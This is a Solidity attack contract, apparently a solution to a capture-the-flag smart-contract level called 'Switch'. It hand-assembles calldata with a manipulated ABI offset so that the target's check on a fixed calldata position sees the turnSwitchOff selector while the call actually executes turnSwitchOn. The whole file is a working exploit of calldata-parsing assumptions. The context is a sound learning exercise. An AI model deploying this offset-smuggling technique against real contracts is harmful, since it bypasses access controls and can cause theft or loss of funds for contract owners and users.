// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SwitchAttck {
    function attack(address _targetAddress) public {
        bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));

        bytes memory _calldata = abi.encodePacked(
            flipSelector,
            bytes32(uint256(0x60)), // offset
            bytes32(0), // padding
            offSelector, // check by onlyOff()
            bytes28(0), // padding
            bytes32(uint256(4)), // bytes.length = 4
            onSelector, // _data
            bytes28(0) // padding
        );

        (bool success, ) = _targetAddress.call(_calldata);
        require(success);
    }
}
